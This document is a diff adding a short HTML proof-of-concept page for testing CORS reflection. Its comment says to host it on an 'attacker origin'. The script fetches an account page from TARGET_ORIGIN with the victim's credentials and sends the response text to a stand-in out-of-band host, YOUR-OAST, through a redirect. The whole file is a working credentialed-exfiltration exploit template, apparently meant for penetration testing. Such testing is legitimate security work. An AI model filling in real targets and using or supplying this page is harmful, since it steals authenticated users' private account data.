@@ -1,0 +1,12 @@
+<html>
+  <body>
+    <script>
+      // This page should be hosted on your attacker origin to test reflection.
+      fetch('https://TARGET_ORIGIN/ACCOUNT_PATH', { credentials: 'include' })
+        .then(r => r.text())
+        .then(t => location='https://YOUR-OAST/log?d='+encodeURIComponent(t))
+        .catch(e => console.log(e));
+    </script>
+  </body>
+</html>
+
